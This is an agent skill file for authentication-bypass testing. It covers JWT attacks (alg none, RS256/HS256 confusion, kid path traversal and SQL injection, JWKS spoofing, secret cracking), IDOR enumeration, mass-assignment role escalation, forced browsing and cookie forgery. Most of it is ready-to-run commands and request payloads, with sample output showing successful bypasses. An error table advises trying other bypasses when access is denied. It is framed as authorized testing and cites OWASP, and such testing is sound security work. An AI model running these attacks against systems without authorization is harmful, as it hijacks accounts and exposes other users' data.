---
name: auth-bypass
description: Test for authentication bypass, broken access control, IDOR, and JWT vulnerabilities. Use when testing authorization controls, when escalating privileges, when manipulating tokens, or when the user needs to verify access control implementation.
tags:
  - security
  - authentication
  - bypass
  - access-control
  - idor
  - jwt
triggers:
  - auth bypass
  - authentication bypass
  - broken access control
  - jwt attack
  - session hijacking
---

# auth-bypass

## When to Use

- Testing access control on authenticated endpoints
- Looking for IDOR (Insecure Direct Object Reference) vulnerabilities
- Testing JWT token security and manipulation
- Verifying role-based access control (RBAC)
- Attempting privilege escalation from user to admin
- Testing session management vulnerabilities
- User provides authenticated requests to test
- Need to verify authorization is properly enforced

## Quick Start

```bash
# JWT attack - Run all tests
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/123" \
    -rh "Authorization: Bearer eyJhbG..."
```

## Step-by-Step Process

1. **Identify Authentication Mechanism**

   Determine what auth is used:
   - JWT tokens (check for `eyJ` prefix)
   - Session cookies
   - API keys
   - OAuth tokens
   - Basic auth

2. **Extract and Decode Tokens**

   ```bash
   # Decode JWT without verification
   python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

3. **Test JWT Vulnerabilities**

   ```bash
   # Run all JWT attacks
   python3 jwt_tool.py -M at \
       -t "https://target.com/api/user" \
       -rh "Authorization: Bearer TOKEN"
   ```

4. **Test IDOR Patterns**

   Modify object references in requests:
   - User IDs: `/api/user/123` → `/api/user/124`
   - UUIDs: Capture and replay other users' UUIDs
   - Sequential: Test `id=1`, `id=2`, `id=3`...
   - Encoded: Decode base64/hex IDs, modify, re-encode

5. **Test Privilege Escalation**

   Manipulate role indicators:
   - `role=user` → `role=admin`
   - `isAdmin=false` → `isAdmin=true`
   - Add admin parameters to requests
   - Access admin endpoints with user session

6. **Document Findings**

   Record successful bypasses with:
   - Original request/response
   - Modified request/response
   - Impact assessment

## JWT Attack Techniques

### Algorithm None Attack

Remove signature verification:

```bash
# Set algorithm to none
python3 jwt_tool.py TOKEN -X a

# Manual: Change header
# {"alg":"none","typ":"JWT"}
# Remove signature portion (third part after second dot)
```

### Algorithm Confusion (RS256 → HS256)

CVE-2016-5431/CVE-2016-10555:

```bash
# Get server's public key
openssl s_client -connect target.com:443 2>&1 < /dev/null | \
    sed -n '/-----BEGIN/,/-----END/p' > cert.pem

# Extract public key
openssl x509 -pubkey -in cert.pem -noout > pubkey.pem

# Sign with public key as HMAC secret
python3 jwt_tool.py TOKEN -X k -pk pubkey.pem
```

### Key ID (kid) Injection

Path traversal:

```bash
# Use /dev/null as key (empty string)
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Use predictable file content
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

SQL injection via kid:

```
kid: non-existent' UNION SELECT 'ATTACKER';-- -
```

### JWKS Spoofing (jku/x5u)

```bash
# Generate new key pair
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt

# Host JWKS on controlled server
# Modify jku header to point to your JWKS URL
python3 jwt_tool.py TOKEN -X s
```

### Weak Secret Brute Force

```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
python3 jwt_tool.py TOKEN -C -d wordlist.txt
```

## IDOR Testing Patterns

### Numeric ID Manipulation

```http
GET /api/orders/1001 HTTP/1.1  # Original
GET /api/orders/1000 HTTP/1.1  # Other IDs
GET /api/orders/1002 HTTP/1.1
```

### UUID Manipulation

```http
GET /api/documents/550e8400-e29b-41d4-a716-446655440000  # Original
GET /api/documents/660e8400-e29b-41d4-a716-446655440001  # Other user's
```

### Parameter Pollution

```http
GET /api/profile?user_id=123&user_id=456
{"user_id": [123, 456]}
```

### HTTP Method Tampering

```http
POST /api/admin/users HTTP/1.1
PUT /api/admin/users HTTP/1.1
DELETE /api/admin/users HTTP/1.1
```

## Privilege Escalation Techniques

### Role Parameter Manipulation

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{"username": "test", "role": "admin", "isAdmin": true}
```

### Forced Browsing

```http
GET /admin HTTP/1.1
GET /api/admin/users HTTP/1.1
GET /dashboard/admin HTTP/1.1
GET /management HTTP/1.1
GET /internal/config HTTP/1.1
```

### Cookie Manipulation

```http
# Modify role in cookie
Cookie: session=abc123; role=admin; isStaff=1

# Base64 encoded cookies - decode, modify, re-encode
Cookie: userdata=eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9
```

## Session Attacks

| Attack           | Test Method                     |
| ---------------- | ------------------------------- |
| Session Fixation | Force session ID before auth    |
| Token Reuse      | Replay password reset tokens    |
| Expired Tokens   | Use tokens after expiry         |
| Race Conditions  | Concurrent requests during auth |

## Examples

### Example 1: JWT None Algorithm

**Scenario:** Test if server accepts unsigned JWT

**Command:**

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIifQ.signature -X a
```

**Output:**

```
[*] Algorithm set to none
[*] New token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIifQ.
```

### Example 2: JWT All Attacks Mode

**Scenario:** Automated JWT vulnerability scan

**Command:**

```bash
python3 jwt_tool.py -M at \
    -t "https://api.target.com/v1/me" \
    -rh "Authorization: Bearer eyJhbG..."
```

**Output:**

```
[*] Running all attacks...
[+] VULNERABLE: Algorithm none accepted!
[+] VULNERABLE: Signature not verified!
[-] NOT VULNERABLE: Key confusion attack
```

### Example 3: IDOR - User Profile

**Scenario:** Access another user's profile

**Original Request:**

```http
GET /api/users/profile/1001 HTTP/1.1
Authorization: Bearer TOKEN
```

**Modified Request:**

```http
GET /api/users/profile/1002 HTTP/1.1
Authorization: Bearer TOKEN
```

**Vulnerable Response:**

```json
{
  "id": 1002,
  "email": "otheruser@example.com",
  "name": "Jane Doe"
}
```

### Example 4: Role Escalation via Mass Assignment

**Scenario:** Elevate privileges during profile update

**Request:**

```http
POST /api/user/update HTTP/1.1
Content-Type: application/json
Authorization: Bearer TOKEN

{
    "name": "Attacker",
    "email": "attacker@test.com",
    "role": "admin",
    "isAdmin": true
}
```

### Example 5: JWT Secret Brute Force

**Command:**

```bash
hashcat -a 0 -m 16500 "eyJhbG...TOKEN..." /usr/share/wordlists/rockyou.txt
```

**Output:**

```
eyJhbG...TOKEN...:secret123
Status...........: Cracked
```

### Example 6: Forced Browsing to Admin Panel

**Request:**

```http
GET /api/admin/users HTTP/1.1
Cookie: session=regular-user-session
```

**Vulnerable Response:**

```json
{
  "users": [
    { "id": 1, "email": "admin@test.com", "role": "admin" },
    { "id": 2, "email": "user@test.com", "role": "user" }
  ]
}
```

### Example 7: kid Path Traversal

**Scenario:** Use predictable file as signing key

**Command:**

```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleXMva2V5MSJ9... \
    -I -hc kid -hv "../../../dev/null" \
    -S hs256 -p ""
```

**Output:**

```
[+] New token with kid pointing to /dev/null:
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0...
```

### Example 8: HTTP Method Override

**Scenario:** Bypass method-based access control

**Request:**

```http
POST /api/admin/delete-user HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
Content-Type: application/json

{"user_id": 123}
```

### Example 9: Array ID Injection

**Scenario:** Access multiple resources in one request

**Request:**

```http
POST /api/orders/export HTTP/1.1
Content-Type: application/json

{
    "order_ids": [1001, 1002, 1003, 2001, 2002]
}
```

### Example 10: Cookie-Based Role Bypass

**Scenario:** Manipulate decoded cookie value

**Original Cookie:**

```
userdata=eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ==
# Decoded: {"user":"bob","role":"user"}
```

**Modified Cookie:**

```
userdata=eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0=
# Decoded: {"user":"bob","role":"admin"}
```

## jwt_tool Command Reference

| Flag         | Description                 |
| ------------ | --------------------------- |
| `-M at`      | All tests mode              |
| `-X a`       | Algorithm none attack       |
| `-X k`       | Key confusion attack        |
| `-X s`       | JWKS spoofing               |
| `-C`         | Crack mode                  |
| `-d FILE`    | Dictionary for cracking     |
| `-I`         | Inject claims               |
| `-hc CLAIM`  | Header claim to modify      |
| `-hv VALUE`  | New header value            |
| `-pc CLAIM`  | Payload claim to modify     |
| `-pv VALUE`  | New payload value           |
| `-S hs256`   | Sign with HS256             |
| `-S hs384`   | Sign with HS384             |
| `-S hs512`   | Sign with HS512             |
| `-p SECRET`  | Password/secret for signing |
| `-pk FILE`   | Public key file             |
| `-t URL`     | Target URL                  |
| `-rh HEADER` | Request header              |
| `-rc COOKIE` | Request cookie              |
| `-T`         | Tamper token                |

## Common IDOR Endpoints

| Endpoint Pattern         | Test                 |
| ------------------------ | -------------------- |
| `/api/user/{id}`         | Change ID            |
| `/api/orders/{order_id}` | Sequential IDs       |
| `/api/documents/{uuid}`  | UUID enumeration     |
| `/api/profile`           | Add user_id param    |
| `/api/settings`          | Add account_id param |
| `/download?file={id}`    | Path traversal       |
| `/export?ids=`           | Array manipulation   |

## Error Handling

| Error                   | Cause                 | Resolution             |
| ----------------------- | --------------------- | ---------------------- |
| `401 Unauthorized`      | Invalid/expired token | Get fresh token        |
| `403 Forbidden`         | Access denied         | Try different bypass   |
| `jwt_tool not found`    | Tool not installed    | `pip install jwt_tool` |
| `Invalid signature`     | Secret incorrect      | Try different secrets  |
| `Token expired`         | Exp claim passed      | Modify exp claim       |
| `Algorithm not allowed` | Server blocks alg     | Try other algorithms   |

## Best Practices

1. **Always Test Multiple Vectors** - IDOR, JWT, session, roles
2. **Chain Vulnerabilities** - IDOR + privilege escalation
3. **Test All HTTP Methods** - GET, POST, PUT, DELETE, PATCH
4. **Check Response Differences** - Status codes, timing, content
5. **Document Everything** - Before/after requests
6. **Test Edge Cases** - Negative IDs, special characters
7. **Verify Actual Impact** - Confirm data access/modification

## Authorization Testing Checklist

- [ ] Test horizontal privilege escalation (user A → user B)
- [ ] Test vertical privilege escalation (user → admin)
- [ ] Test JWT signature verification
- [ ] Test JWT algorithm manipulation
- [ ] Test IDOR on all object references
- [ ] Test forced browsing to admin endpoints
- [ ] Test parameter-based access control
- [ ] Test HTTP method restrictions
- [ ] Test cookie/session manipulation
- [ ] Test role parameter injection

## References

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
- [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
- [HackTricks JWT](https://book.hacktricks.wiki/pentesting-web/hacking-jwt-json-web-tokens.html)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OWASP Testing Guide - Authorization](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README)
